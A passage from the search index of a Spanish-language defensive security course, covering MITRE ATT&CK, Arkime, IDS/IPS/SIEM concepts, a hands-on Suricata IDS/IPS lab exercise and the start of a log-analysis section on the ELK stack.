t\u00e9cnicas del adversario y conocimiento com\u00fan\". En una fuente de informaci\u00f3n colaborativa entre los profesionales de seguridad. </p> <p>Permite identificar mejor la huella de TTP (t\u00e9cnicas, t\u00e1cticas y procedimientos) m\u00e1s amplia (y m\u00e1s profunda) que un adversario dado deja atr\u00e1s en el curso de una campa\u00f1a de penetraci\u00f3n. Es una fuente a tener en cuenta para entender c\u00f3mo operan los atacantes. </p> <p>Los defensores utilizan este framework y las herramientas asociadas en funci\u00f3n de la fuente de datos que posean. Muchas de estas herramientas pueden tener capacidades que se superpongan pero representan la mejor opci\u00f3n para formar un conjunto amplio que nos permita defendernos de forma efectiva.</p> <p>Dependiendo del tipo de dato que tengamos, las herramientas se categorizan de forma diferente:</p> <p></p> <p>Si por ejemplo tuvi\u00e9ramos una fuente de datos relacionados con la red, podr\u00edamos mapear estos datos con MITRE ATT&amp;CK:</p> <p></p> <p>Y as\u00ed sucesivamente.</p>"},{"location":"segdef/arkime/#glosario-de-terminos","title":"Glosario de terminos","text":""},{"location":"segdef/arkime/#arkime","title":"Arkime","text":"<p>Cita de Arkime</p> <p>Augment your current security infrastructure to store and index network traffic in standard PCAP format. Arkime is not meant to replace Intrusion Detection Systems (IDS) but instead provides more visibility. </p>"},{"location":"segdef/arkime/#command-and-control-c2","title":"Command and control (C2)","text":"<p>Cita de Tarlogic</p> <p>La mayor\u00eda de las amenazas necesitan conectarse a un entorno fuera de la organizaci\u00f3n, donde poder comunicarse con los operadores de estas amenazas (Threat Actors) para recibir instrucciones, exfiltrar informaci\u00f3n, etc. Estas comunicaciones de manera general no son contra los entornos finales de estos actores, sino que son hacia servidores que controlan, centralizan la informaci\u00f3n y realizan las acciones necesarias. Estos servidores se conocen como servidores Command and Control, C&amp;C o C2.</p>"},{"location":"segdef/arkime/#ioc","title":"IOC","text":"<p>Cita de attacksimulator</p> <p>Los indicadores de compromiso o IoCs son pistas y pruebas de una brecha de datos, que generalmente se ven durante un ataque de ciberseguridad. Estos indicadores pueden revelar que se ha producido un ataque, qu\u00e9 herramientas se han utilizado para el mismo y qui\u00e9n est\u00e1 detr\u00e1s. Suelen ser recolectados a trav\u00e9s del software, incluyendo los sistemas antivirus y antimalware. Para entenderlo mejor, intenta pensar que los indicadores de compromiso son como las migas de pan que deja un atacante tras un ciberataque.</p>"},{"location":"segdef/arkime/#emotet","title":"Emotet","text":"<p>Cita de malwarebytes</p> <p>El troyano bancario Emotet fue identificado por primera vez por investigadores de seguridad en 2014. Emotet fue dise\u00f1ado originalmente como un malware bancario que intentaba colarse en su ordenador y robar informaci\u00f3n confidencial y privada. En versiones posteriores del software se a\u00f1adieron los servicios de env\u00edo de spam y malware, incluidos otros troyanos bancarios.</p>"},{"location":"segdef/arkime/#lokibot","title":"Lokibot","text":"<p>Cita de WeLiveSecurity</p> <p>Lokibot, tambi\u00e9n conocido como Loki PWS o Loki-bot, es un malware perteneciente a la familia de troyanos que est\u00e1 activo desde 2015 y es utilizado desde entonces en campa\u00f1as a nivel global. Fue dise\u00f1ado con el objetivo de robar credenciales de navegadores, clientes FTP/ SSH, sistemas de mensajer\u00eda, y hasta incluso de billeteras de criptomonedas.</p>"},{"location":"segdef/arkime/#spear-phising","title":"Spear phising","text":"<p>Cita de Kasperksy</p> <p>El spear phishing es una estafa de correo electr\u00f3nico o comunicaciones dirigida a personas, organizaciones o empresas espec\u00edficas. Aunque su objetivo a menudo es robar datos para fines maliciosos, los cibercriminales tambi\u00e9n pueden tratar de instalar malware en la computadora de la v\u00edctima.</p>"},{"location":"segdef/arkime/#demostracion-practica-de-arkime","title":"Demostraci\u00f3n pr\u00e1ctica de Arkime","text":"<ul> <li> <p>Analizando tr\u00e1fico spear phising (Dridex)</p> </li> <li> <p>Identificando tr\u00e1fico C2C (Emotet)</p> </li> <li> <p>Identificando tr\u00e1fico C2C (Lokibot)</p> </li> <li> <p>Identificaci\u00f3n de malware usando comunicaciones seguras con TLS y utilizaci\u00f3n de hashes JA3 para detectar nodos del command&amp;control</p> </li> </ul>"},{"location":"segdef/arkime/#referencias","title":"Referencias","text":"<p>La matriz de MITRE: t\u00e1cticas y t\u00e9cnicas en entornos industriales</p> <p>How to Use MITRE ATT&amp;CK to Map and Track Adversary TTPs</p>"},{"location":"segdef/idps/","title":"Monitorizaci\u00f3n mediante sistemas detectores de intrusos (IDS) y sistemas de prevenci\u00f3n de intrusos (IPS)","text":""},{"location":"segdef/idps/#introduccion","title":"Introducci\u00f3n","text":"<p>En esta secci\u00f3n vamos a hacer una revisi\u00f3n de los IDS, los IPS y, de refil\u00f3n, de los SIEM.  Se trata de tres herramientas que, aunque parecidas, contribuyen de forma diferente a la protecci\u00f3n de nuestras redes y sistemas. Estamos hablando de unas herramientas de monitorizaci\u00f3n puesto que examinan el tr\u00e1fico que entra y/o sale de nuestra red en b\u00fasqueda de comportamientos sospechosos.</p> <p></p>"},{"location":"segdef/idps/#ids","title":"IDS","text":"<p>Son sistemas que monitorizan el tr\u00e1fico entrante y lo cotejan con una base de datos actualizada de firmas de ataque conocidas. Ante cualquier actividad sospechosa, emiten una alerta a los administradores del sistema quienes han de tomar las medidas oportunas. Estos accesos pueden ser ataques espor\u00e1dicos realizados por usuarios malintencionados o repetidos cada cierto tiempo, lanzados con herramientas autom\u00e1ticas. Estos sistemas s\u00f3lo detectan los accesos sospechosos emitiendo alertas anticipatorias de posibles intrusiones, pero no tratan de mitigar la intrusi\u00f3n. Su actuaci\u00f3n es reactiva.</p>"},{"location":"segdef/idps/#como-funcionan-los-ids","title":"\u00bfC\u00f3mo funcionan los IDS?","text":"<p>Podemos distinguir dos tipos de IDS:</p> <ol> <li>NIDS (Network-based intrusion detections systems): Monitorizan el tr\u00e1fico de dos formas; o bien configur\u00e1ndolo para que todo el tr\u00e1fico de la red pase a trav\u00e9s de \u00e9l o haciendo un port mirroring.</li> <li>HIDS (Host-based intrusion detections systems): Se configura un sistema para comprobar actividad sospechosa o an\u00f3mala en un host concreto en lugar de en toda la red. Esto limita en gran medida los dipositivos que se monitorizan pero permite detectar con mayor detalle amenazas en ese host.</li> </ol> <p>T\u00edpicamente se utilizan tres metodolog\u00edas para detectar incidentes:</p> <ul> <li> <p>Basada en firmas: compara las firmas con los eventos observados para identificar posibles incidentes. Se trata del m\u00e9todo de detecci\u00f3n m\u00e1s sencillo, ya que compara \u00fanicamente la unidad de actividad actual (como por ejemplo un paquete o una entrada de log) contra una lista de firmas mediante operaciones de comparaci\u00f3n de cadenas.      Estas firmas permiten al IDS distinguir entre el uso normal del PC y el uso fraudulento, y/o entre el tr\u00e1fico normal de la red y el tr\u00e1fico que puede ser resultado de un ataque o intento del mismo y sonpatrones de ataque preconfigurados y predeterminados.</p> <p></p> </li> <li> <p>Detecci\u00f3n basada en anomal\u00edas: compara las definiciones de lo que se considera una actividad normal con los eventos observados para identificar desviaciones significativas. Este m\u00e9todo de detecci\u00f3n puede ser muy eficaz para detectar amenazas desconocidas hasta ahora.</p> <p></p> </li> <li> <p>An\u00e1lisis de protocolos de estado: utiliza informaci\u00f3n sobre las conexiones entre hosts y la compara con las entradas de una tabla de estado. La tabla de estado mantiene un registro de la conexi\u00f3n entre las computadoras que incluye: direcci\u00f3n IP de origen y puerto, direcci\u00f3n IP de destino y puerto, y los protocolos que se utilizan.      Este m\u00e9todo busca cambios repentinos o bruscos en la actividad de la red. Otras funciones incluyen a veces el seguimiento del estado del protocolo, los an\u00e1lisis din\u00e1micos del protocolo de aplicaci\u00f3n y el reensamblaje de paquetes IP, lo que evita que fragmentos de paquetes IP lleguen a la red interna.</p> <p>Entre las ventajas del an\u00e1lisis de protocolo de estado est\u00e1n:</p> <ul> <li>Identifica secuencias inesperadas de comandos.</li> <li>A\u00f1ade caracter\u00edsticas de estado al an\u00e1lisis regular de protocolos.</li> <li>Comprueba la racionalidad de los umbrales de los comandos individuales.</li> </ul> <p>Entre las desventajas est\u00e1n:</p> <ul> <li>Uso intensivo de recursos, sobrecarga de recursos elevada.</li> <li>No puede detectar ataques que no violen las caracter\u00edsticas de comportamiento del protocolo generalmente aceptado.</li> <li>Presenta conflictos entre el modelo de protocolo utilizado por el sistema y c\u00f3mo se implementa realmente el protocolo.</li> </ul> </li> </ul>"},{"location":"segdef/idps/#ips","title":"IPS","text":"<p>IPS (Intrusion Prevention System) o sistema de prevenci\u00f3n de intrusiones: es un software que se utiliza para proteger a los sistemas de ataques e intrusiones. Como su nombre indica, su actuaci\u00f3n es de car\u00e1cter preventivo. </p> <p>Estos sistemas llevan a cabo un an\u00e1lisis en tiempo real de las conexiones y los protocolos para determinar si se est\u00e1 produciendo o se va a producir un incidente, identificando ataques seg\u00fan patrones, anomal\u00edas o comportamientos sospechosos y permitiendo el control de acceso a la red, implementando pol\u00edticas que se basan en el contenido del tr\u00e1fico monitorizado, es decir, el IPS adem\u00e1s de lanzar alarmas, puede descartar paquetes y desconectar conexiones.</p> <p></p> <p>Muchos proveedores ofrecen productos mixtos, llam\u00e1ndolos IPS/IDS, integr\u00e1ndose frecuentemente con cortafuegos y UTM (en ingl\u00e9s Unified Threat Management o Gesti\u00f3n Unificada de Amenazas) que controlan el acceso en funci\u00f3n de reglas sobre protocolos y sobre el destino u origen del tr\u00e1fico.</p> <p></p>"},{"location":"segdef/idps/#limitaciones-de-de-los-idsips","title":"Limitaciones de de los IDS/IPS","text":"<p>No todo es bonito con estos sistemas, algunos de sus handicaps m\u00e1s importantes son:</p> <ul> <li>Un IDS s\u00f3lo detectar\u00e1 lo que est\u00e9 configurado para detectar. Es decir, est\u00e1n limitados \u00fanicamente a detectar ataques ya conocidos. </li> <li>Son completamente dependientes de las reglas que escribamos o les carguemos y esto lleva inevitablemente a los falsos positivos. Una regla configurada para detectar un ataque tambi\u00e9n puede generar una alerta ante tr\u00e1fico leg\u00edtimo si \u00e9sta no ha sido configurada con sumo cuidado o si el ataque usa un patr\u00f3n com\u00fan de tr\u00e1fico.</li> <li>Capacidades limitadas ante tr\u00e1fico cifrado.</li> <li>Su visibilidad est\u00e1 limitada en funci\u00f3n de d\u00f3nde se coloquen en la red.</li> </ul>"},{"location":"segdef/idps/#siem","title":"SIEM","text":"<p>SIEM (Security Information and Event Management) o sistema de gesti\u00f3n de eventos e informaci\u00f3n de seguridad: es una soluci\u00f3n h\u00edbrida centralizada que engloba la gesti\u00f3n de informaci\u00f3n de seguridad (Security Information Management) y la gesti\u00f3n de eventos (Security Event Manager). </p> <p>La tecnolog\u00eda SIEM proporciona un an\u00e1lisis en tiempo real de las alertas de seguridad generadas por los distintos dispositivos hardware y software de la red. Recoge los registros de actividad (logs) de los distintos sistemas, los relaciona y detecta eventos de seguridad, es decir, actividades sospechosas o inesperadas que pueden suponer el inicio de un incidente, descartando los resultados an\u00f3malos, tambi\u00e9n conocidos como falsos positivos y generando respuestas acordes en base a los informes y evaluaciones que registra, es decir, es una herramienta en la que se centraliza la informaci\u00f3n y se integra con otras herramientas de detecci\u00f3n de amenazas.</p> <p></p>"},{"location":"segdef/idps/#suricata","title":"Suricata","text":"<p>Suricata es un sistema de detecci\u00f3n de c\u00f3digo abierto que puede actuar tanto como IDS como IPS. Su desarrollo corresponde a Open Information Security Foundation (OSIF). Utiliza un set de reglas y firmas que permite detectar y prevenir amenazas. Puede correr en Windows, Mac, Unix y Linux.</p> <p></p>"},{"location":"segdef/idps/#suricata-vs-snort","title":"Suricata vs Snort","text":"<p>Snort es el otro gran actor conocido en el juego de los IDS. Tambi\u00e9n de c\u00f3digo abierto, aunque posee dos sets de reglas principales: las community edition y las de suscriptor. Estas \u00faltimas son de pago y est\u00e1n desarrolladas, probadas y aprobadas por el grupo de seguridad de Cisco, Talos. </p> <p></p> <p>En esencia, Suricata permite acciones por defecto (principalmente relacionadas con la funcionalidad de IPS), que Snort no. No obstante, con una serie de modificaciones es posible hacer que la funcionalidad de Snort pueda ser casi igual, sino igual, a la de Suricata. A\u00fan con todo esto y siempre sin tener en cuenta preferencias personales, podemos destacar algunas ventajas de Suricata:</p> <ul> <li>Trabaja con multithreading. Esto representa una gran ventaja puesto que a d\u00eda de hoy es normal analizar grandes cantidades de tr\u00e1fico que requieren un gran procesado, por lo que sin duda este punto marca una gran diferencia.</li> <li>Es multitenancy. Esto quiere decir que podemos tener diferentes conjuntos de reglas aplic\u00e1ndose al mismo tiempo y asignar cada una de ellas a una VLAN diferente, por ejemplo.</li> <li>Se podr\u00eda decir que el logging de Suricata es de mejor calidad y que permite extraer mayor informaci\u00f3n del tr\u00e1fico que lo atraviesa.</li> <li>Permite utilizar directamente, sin modificaci\u00f3n alguna, las reglas de Snort.</li> </ul> <p>Como todo, siempre hay desventajas o inconvenientes, quiz\u00e1s incluso aplicable a cualquier IDS/IPS:</p> <ul> <li>La configuraci\u00f3n es ardua y dif\u00edcil. Tunearlo hasta que sea realmente \u00fatil puede llegar a ser un aut\u00e9ntico calvario que haga replantearse la utilidad vs esfuerzo.</li> <li>Una de las causas del punto anterior ser\u00eda la gran cantidad de falsos positivos debido a reglas, en ocasiones, demasiado gen\u00e9ricas. Las reglas de pago de Snort por ejemplo mejoran esto en gran medida.</li> <li>Las empresas que se lo pueden permitir econ\u00f3micamente suelen desestimar Suricata en favor de soluciones comerciales como los NGFW (Next Generation Firewalls) o plataformas como las de Fortinet o IBM.</li> <li>Hoy en d\u00eda gran cantidad del tr\u00e1fico va cifrado y el SSL Stripping puede convertirse en un gran problema, ya sea por condiciones de confidencialidad, como por la gran cantidad de recursos que supone de hardware, de adminstraci\u00f3n de endpoints o errores de certificados en los firewalls.</li> </ul>"},{"location":"segdef/idps/#demo-y-ejercicios","title":"Demo y ejercicios","text":"<p>Info</p> <p>Para este ejercicio he utilizado una m\u00e1quina virtual Debian 11 Bullseye con la interfaz en modo puente, instalando Suricata desde los repositorios. Si bien Suricata puede instalarse en cualquier distribuci\u00f3n, es posible que necesit\u00e9is algunos pasos adicionales o algo diferentes si utiliz\u00e1is otra.</p> <p>Atenci\u00f3n</p> <p>Todos los comandos de esta demo han sido ejecutados con el usuario root o, en su defecto, usando <code>sudo</code>.</p> <p>En este ejercicio deber\u00e9is llevar a cabo las siguientes acciones:</p> <ol> <li> <p>Instalar Suricata     Hay varias opciones para instalar:</p> <ul> <li>Desde el repositorio de paquetes de la distribuci\u00f3n Linux en concreto</li> <li>Desde un repositorio personal (PPA)</li> <li>Compilando el c\u00f3digo fuente</li> </ul> <p>Yo os recomiendo la primera opci\u00f3n, que siempre es la m\u00e1s sencilla.</p> </li> <li> <p>Configurarlo como IDS</p> <ul> <li>El archivo de configuraci\u00f3n a modificar est\u00e1 en <code>/etc/suricata/suricata.yaml</code></li> <li> <p>Comprobad el nombre de la interfaz de vuestra m\u00e1quina:</p> <p></p> </li> <li> <p>Tras ello, en el archivo de configuraci\u00f3n anterior, colocadlo donde corresponde en la secci\u00f3n <code>af.packet</code> del mismo:   </p> <p></p> </li> <li> <p>Para permitir que Suricata permita una recarga en vivo de las reglas, es decir, que se puedan a\u00f1adir, eliminar y editar las reglas sin la necesidad de reiniciar el proceso de Suricata:    </p> <p></p> <p>Y con este comando le diremos a Suricata que recargue todas las reglas sin reiniciar el proceso:</p> <pre><code>kill -usr2 $(pidof suricata)\n</code></pre> </li> <li> <p>Actualizamos las reglas de Suricata:</p> <pre><code>suricata-update -o /etc/suricata/rules\n</code></pre> </li> <li> <p>Y para validar la configuraci\u00f3n (tardar\u00e1 un poco):     </p> </li> <li> <p>Se inicia el servicio y se comprueba que est\u00e1 activo (tardar\u00e1 un par de minutos en cargar y parsear las reglas):     <pre><code>systemctl start suricata.service\n\nsystemctl start suricata.service\n</code></pre> </p> </li> </ul> </li> <li> <p>Comprobar que muestra las alertas que detecta de acuerdo a sus reglas</p> <ul> <li> <p>Probaremos la siguiente regla (explicaci\u00f3n del formato de las reglas/firmas):</p> <p></p> <p>Que generar\u00e1 una alarma cuando un posible intruso use el comando <code>id</code> y \u00e9ste responda con root. </p> <p>Para comprobarlo, accederemos a un site que simule este comportamiento ejecutando lo el siguiente comando:</p> <pre><code>curl http://testmynids.org/uid/index.html\n</code></pre> </li> <li> <p>Y examinamos los logs en busca de la alerta, utilizando su identificador:</p> <p></p> <p>Suricata tambi\u00e9n loguea eventos en <code>/var/log/suricata/eve.log</code> usando un formato JSON. La documentaci\u00f3n de Suricata recomienda usar la utilidad <code>jq</code> para leer y filtrar las entradas de este archivo. As\u00ed pues, lo instalamos:</p> <pre><code>apt install jq\n</code></pre> <p>Y buscamos la alerta correspondiente:</p> <pre><code>jq 'select(.alert .signature_id==2100498)' /var/log/suricata/eve.json\n</code></pre> </li> </ul> <p>Tarea</p> <p>Documenta adecuadamente todo este proceso con las capturas de pantalla y las explicaciones pertinentes que demuestren la realizaci\u00f3n y comprobaci\u00f3n del mismo.</p> </li> <li> <p>Configurar Suricata como IPS y comprobar su funcionamiento</p> <p>En este caso vamos a ver como trabajar en capa 3 con el modo inline de Suricata usando <code>iptables</code>. Para ello, necesitamos instalar una dependencia:</p> <pre><code>apt-get -y install libnetfilter-queue-dev\n</code></pre> <p>Ahora haremos que Suricata corra en modo NFQ, o lo que es lo mismo, le decimos que acepte los paquetes que le reenv\u00ede <code>iptables</code> sin que el firewall siga aplicando sus reglas al paquete (es posible que tarde varios minutos):</p> <p><pre><code>suricata -c /etc/suricata/suricata.yaml -q 0\n</code></pre> De la misma forma, debemos decirle al firewall que reenv\u00ede todos los paquete que entran y salen de nuestra m\u00e1quina a Suricata:</p> <pre><code>sudo iptables -I INPUT -j NFQUEUE\nsudo iptables -I OUTPUT -j NFQUEUE\n</code></pre> <p>Podemos ver las reglas activas del firewall con:</p> <pre><code>iptables -vnL\n</code></pre> <p>Por defecto Suricata corre en modo IDS as\u00ed que para activar el IPS haremos:</p> <p><pre><code>systemctl edit suricata.service\n</code></pre> Y a\u00f1adimos las l\u00edneas resaltadas:</p> <pre><code>### Editing /etc/systemd/system/suricata.service.d/override.conf\n### Anything between here and the comment below will become the new contents of the file\n\n[Service]\nExecStart= \nExecStart=/usr/bin/suricata -c /etc/suricata/suricata.yaml --pidfile /run/suricata.pid -q 0 -vvv\nType=simple\n### Lines below this comment will be discarded\n. . .\n</code></pre> <p>Donde <code>ExecStart=</code> borra el comando por defecto que systemd utiliza para iniciar un servicio. La siguiente l\u00ednea define el nuevo comando a utilizar y <code>Type=simple</code> se asegura de que systemd pueda manejar el proceso de Suricata como cualquier otro servicio cuando est\u00e1 corriendo en modo IPS.</p> <p>Guardamos y reiniciamos systemd para que detecte la nueva configuraci\u00f3n del servicio de Suricata:</p> <pre><code>systemctl daemon-reload\n</code></pre> <p>Reiniciamos Suricata y comprobamos su estado:</p> <pre><code>sudo systemctl restart suricata.service\nsudo systemctl status suricata.service\n</code></pre> <p>Tarea</p> <p>Modifica la regla que hemos comprobado anteriormente para que en lugar de generar una alerta (alert), descarte (drop) los paquetes que hagan match con esa regla.</p> </li> <li> <p>Escribir una regla para el IPS y comprobar que funciona</p> <p>Para este cometido vamos otra vez al archivo de configuraci\u00f3n <code>suricata.yaml</code> y le vamos a indicar que tenga en cuenta un nuevo fichero de reglas/firmas que crearemos m\u00e1s tarde con nuestra regla concreta:</p> <p></p> <p>Tarea</p> <p>A partir de la documentaci\u00f3n proporcionada o de otra que pod\u00e1is encontrar por Internet, escribid una regla de Suricata para que cuando se produzca una conexi\u00f3n desde cualquier IP origen a cualquier IP destino y puerto 8000, el tr\u00e1fico sea bloqueado por <code>iptables</code>.  Ponedle SID 9000001 por ejemplo, para que no haya conflicto con otra regla ya existente. Para comprobarla, en la m\u00e1quina donde est\u00e1 Suricata:</p> <pre><code>nc -nvlp 8000\n</code></pre> <p>Y en la m\u00e1quina anfitriona:</p> <p><pre><code>nc IP_Maq_Virtual 8000\n</code></pre> </p> <p>Nota</p> <p>Recordad el comando para recargar las reglas (puede tardar un rato): <pre><code>kill -USR2 $(pidof suricata)\n</code></pre> Si no os funciona, de acuerdo con la documentaci\u00f3n, probad:</p> <pre><code>suricatasc -c ruleset-reload-nonblocking\n</code></pre> </li> </ol>"},{"location":"segdef/idps/#referencias","title":"Referencias","text":"<p>\u00bfQu\u00e9 son y para qu\u00e9 sirven los SIEM, IDS e IPS?</p> <p>Suricata vs snort </p> <p>How to install Suricata in Debian 11</p> <p>How To Install Suricata on Debian 11/Debian 10</p> <p>Suricta User Guide</p>"},{"location":"segdef/logs/","title":"An\u00e1lisis de logs en seguridad defensiva y respuesta a incidentes","text":""},{"location":"segdef/logs/#introduccion","title":"Introducci\u00f3n","text":"<p>El an\u00e1lisis de logs es el proceso de revisar logs de eventos generados por un computador para, de esta forma, identificar de forma proactiva bugs, amenazas de seguridad u otros riesgos. El an\u00e1lisis de logs puede usarse en un espectro m\u00e1s amplio, como por ejemplo el cumplimiento de determinadas normativas o revisar comportamientos de los usuarios.</p> <p>Un log es un archivo que captura toda actividad dentro del sistema operativo, aplicaci\u00f3n software o dispositivo. Estos archivos documentan autom\u00e1ticamente cualquier informaci\u00f3n designada por los administradores de sistemas, incluyendo:</p> <ul> <li>Mensajes</li> <li>Reportes de error</li> <li>Peticiones de archivo</li> <li>Transferencia de archivos</li> <li>Peticiones login/logout</li> </ul> <p>De igual manera la actividad viene marcada con fecha y hora, lo que ayuda a los profesionales a mantener una traza del evento en cuesti\u00f3n.</p>"},{"location":"segdef/logs/#por-que-es-importante-el-analisis-de-los-logs","title":"\u00bfPor qu\u00e9 es importante el an\u00e1lisis de los logs?","text":"<p>En muchos casos, por una cuesti\u00f3n legal. Las organizaciones se deben adherir a una regulaci\u00f3n espec\u00edfica que dicta como se almacena y analizan los datos.</p> <p>Mas all\u00e1 de los requerimientos legales, el an\u00e1lisis de los logs, cuando se hace de forma eficaz, puede proporcionar difrenetes beneficios para el negocio. A continuaci\u00f3n vemos algunos.</p>"},{"location":"segdef/logs/#un-mejor-troubleshooting","title":"Un mejor troubleshooting","text":"<p>Las organizaciones que revisan y analizan regularmente los logs suelen ser capaces de identificar errores con mayor rapidez. Con una herramienta avanzada de an\u00e1lisis de logs, la empresa puede incluso ser capaz de localizar los problemas antes de que se produzcan, lo que reduce en gran medida el tiempo y el coste de remediaci\u00f3n.</p> <p>El log tambi\u00e9n ayuda al analizador de logs a revisar los eventos que llevan al error, lo que puede hacer que el problema sea m\u00e1s f\u00e1cil de solucionar (troubleshooting), as\u00ed como de prevenir en el futuro.</p>"},{"location":"segdef/logs/#mejora-de-la-seguridad","title":"Mejora de la seguridad","text":"<p>Un an\u00e1lisis eficaz de los logs refuerza considerablemente las capacidades de ciberseguridad de la organizaci\u00f3n. La revisi\u00f3n y el an\u00e1lisis peri\u00f3dicos de los logs ayudan a las organizaciones a detectar con mayor rapidez las anomal\u00edas, contener las amenazas y priorizar las respuestas.</p>"},{"location":"segdef/logs/#experiencia-de-usuario-mejorada","title":"Experiencia de usuario mejorada","text":"<p>El an\u00e1lisis de logs ayuda a las empresas a garantizar que todas las aplicaciones y herramientas orientadas al cliente est\u00e9n plenamente operativas y seguras. La revisi\u00f3n coherente y proactiva de los eventos de logs ayuda a la organizaci\u00f3n a identificar r\u00e1pidamente las interrupciones o incluso a prevenir dichos problemas, mejorando la satisfacci\u00f3n y reduciendo la rotaci\u00f3n de personal.</p>"},{"location":"segdef/logs/#como-se-realiza-el-analisis-de-logs","title":"\u00bfC\u00f3mo se realiza el an\u00e1lisis de logs?","text":"<p>El an\u00e1lisis de logs suele realizarse en un sistema de gesti\u00f3n de logs, una soluci\u00f3n de software que recopila, clasifica y almacena datos de log y logs de eventos de diversas fuentes.</p> <p></p> <p>La plataforma de gesti\u00f3n de logs permite al equipo inform\u00e1tico y a los profesionales de la seguridad establecer un \u00fanico punto desde el que acceder a todos los datos relevantes de puntos finales, redes y aplicaciones. Normalmente, este archivo de log est\u00e1 totalmente indexado y permite realizar b\u00fasquedas, lo que significa que el analizador de logs puede acceder f\u00e1cilmente a los datos que necesita para tomar decisiones sobre la salud de la red, la asignaci\u00f3n de recursos o la seguridad.</p> <p>La actividad suele incluir:</p> <p>Ingesti\u00f3n: Instalaci\u00f3n de un recolector de logs para recopilar datos de diversas fuentes, como el sistema operativo, las aplicaciones, los servidores, los hosts y cada punto final, en toda la infraestructura de red.</p> <p>Centralizaci\u00f3n: Agregaci\u00f3n de todos los datos de log en una \u00fanica ubicaci\u00f3n, as\u00ed como en un formato estandarizado independientemente de la fuente de log. Esto ayuda a simplificar el proceso de an\u00e1lisis y a aumentar la velocidad a la que se pueden aplicar los datos en toda la empresa.</p> <p>B\u00fasqueda y an\u00e1lisis: Aprovechamiento de una combinaci\u00f3n de an\u00e1lisis de logs habilitados por IA/ML y recursos humanos para revisar y analizar errores conocidos, actividades sospechosas u otras anomal\u00edas dentro del sistema. Dada la gran cantidad de datos disponibles en el log, es importante automatizar tanto como sea posible el proceso de an\u00e1lisis del archivo de log. Tambi\u00e9n se recomienda crear una representaci\u00f3n gr\u00e1fica de los datos, mediante gr\u00e1ficos de conocimiento u otra t\u00e9cnica, para ayudar al equipo de TI a visualizar cada entrada del log, su cronolog\u00eda e interrelaciones.</p> <p>Supervisi\u00f3n y alertas: El sistema de gesti\u00f3n de logs debe aprovechar el an\u00e1lisis avanzado de logs para supervisar continuamente el log de cualquier evento de log que requiera atenci\u00f3n o intervenci\u00f3n humana. El sistema puede programarse para que emita alertas autom\u00e1ticamente cuando se produzcan determinados eventos o no se cumplan determinadas condiciones.</p> <p>Informes: Por \u00faltimo, el LMS debe proporcionar un informe racionalizado de todos los eventos, as\u00ed como una interfaz intuitiva que el analizador de logs pueda aprovechar para obtener informaci\u00f3n adicional del log. Las limitaciones de la indexaci\u00f3n</p> <p></p> <p>Muchas soluciones de software de gesti\u00f3n de logs se basan en la indexaci\u00f3n para organizar el log. Aunque en el pasado se consideraba una soluci\u00f3n eficaz, la indexaci\u00f3n puede ser una actividad muy costosa desde el punto de vista inform\u00e1tico, lo que provoca latencia entre los datos que entran en un sistema y los que se incluyen en los resultados de b\u00fasqueda y las visualizaciones. A medida que aumenta la velocidad a la que se producen y consumen los datos, \u00e9sta es una limitaci\u00f3n que podr\u00eda tener consecuencias devastadoras para las organizaciones que necesitan una visi\u00f3n en tiempo real del rendimiento y los eventos del sistema.</p> <p>Adem\u00e1s, con las soluciones basadas en \u00edndices, los patrones de b\u00fasqueda tambi\u00e9n se definen en funci\u00f3n de lo que se ha indexado. Esta es otra limitaci\u00f3n cr\u00edtica, sobre todo cuando se necesita una investigaci\u00f3n y no se pueden buscar los datos disponibles porque no se han indexado correctamente.</p> <p>Las soluciones l\u00edderes ofrecen b\u00fasqueda de texto libre, que permite al equipo de TI buscar en cualquier campo de cualquier log. Esta capacidad ayuda a mejorar la velocidad a la que el equipo puede trabajar sin comprometer el rendimiento.</p>"},{"location":"segdef/logs/#analisis-de-logs-desde-la-linea-de-comandos","title":"An\u00e1lisis de logs desde la l\u00ednea de comandos","text":"<p>Demostraci\u00f3n pr\u00e1ctica.</p>"},{"location":"segdef/logs/#metodos-de-analisis-de-logs","title":"M\u00e9todos de an\u00e1lisis de logs","text":"<p>Dada la enorme cantidad de datos que se crean en el mundo digital actual, a los profesionales de TI les resulta imposible gestionar y analizar manualmente los logs de un entorno tecnol\u00f3gico en expansi\u00f3n. Por ello, necesitan un sistema avanzado de gesti\u00f3n de logs y t\u00e9cnicas que automaticen los aspectos clave de los procesos de recopilaci\u00f3n, formateo y an\u00e1lisis de datos.</p> <p>Estas t\u00e9cnicas incluyen:</p> <p>Normalizaci\u00f3n</p> <p>La normalizaci\u00f3n es una t\u00e9cnica de gesti\u00f3n de datos que garantiza que todos los datos y atributos del log de transacciones, como direcciones IP y marcas de tiempo, tengan un formato coherente.</p> <p>Reconocimiento de patrones</p> <p>El reconocimiento de patrones se refiere al filtrado de eventos basado en un libro de patrones con el fin de separar los eventos rutinarios de las anomal\u00edas.</p> <p>Clasificaci\u00f3n y etiquetado</p> <p>La clasificaci\u00f3n y el etiquetado es el proceso de etiquetar los eventos con palabras clave y clasificarlos por grupos para poder revisar juntos los eventos similares o relacionados.</p> <p>An\u00e1lisis de correlaci\u00f3n</p> <p>El an\u00e1lisis de correlaci\u00f3n es una t\u00e9cnica que recopila datos de log de varias fuentes diferentes y revisa la informaci\u00f3n en su conjunto mediante el an\u00e1lisis de logs.</p> <p>Ignorancia artificial</p> <p>La ignorancia artificial se refiere a la desatenci\u00f3n activa de entradas que no son materiales para la salud o el rendimiento del sistema.</p>"},{"location":"segdef/logs/#elk-stack","title":"ELK Stack","text":"<p>La pila ELK (ELK stack) es una colecci\u00f3n de tres productos de c\u00f3digo abierto: Elasticsearch, Logstash y Kibana. La pila ELK proporciona logs centralizados para identificar problemas con servidores o aplicaciones. Permite buscar todos los logs en un \u00fanico lugar. Tambi\u00e9n ayuda a encontrar problemas en varios servidores mediante la conexi\u00f3n de logs durante un per\u00edodo de tiempo espec\u00edfico.</p> <ul> <li>E de ElasticSearch: se utiliza para almacenar logs, permitiendo su ingesta as\u00ed como b\u00fasquedas e indexaci\u00f3n.</li> <li>L significa LogStash: se utiliza tanto para el env\u00edo como para el procesamiento y almacenamiento de logs. Ofrece unificaci\u00f3n de datos de diferentes fuentes.</li> <li>K significa Kibana: es una herramienta de visualizaci\u00f3n (una interfaz web) que se aloja a trav\u00e9s de Nginx o Apache. Est\u00e1 especializado en grandes vol\u00famenes de datos, as\u00ed como datos en tiempo real.</li> </ul> <p>Posteriormente un cuarto producto se ha a\u00f1adido, Beats, que gestiona los agentes que recopila y env\u00edan sus logs a ELK desde cada m\u00e1quina.</p> <p>ElasticSearch, LogStash y Kibana son desarrollados, gestionados y mantenidos por la empresa Elastic.</p> <p>ELK Stack est\u00e1 dise\u00f1ado para permitir a los usuarios 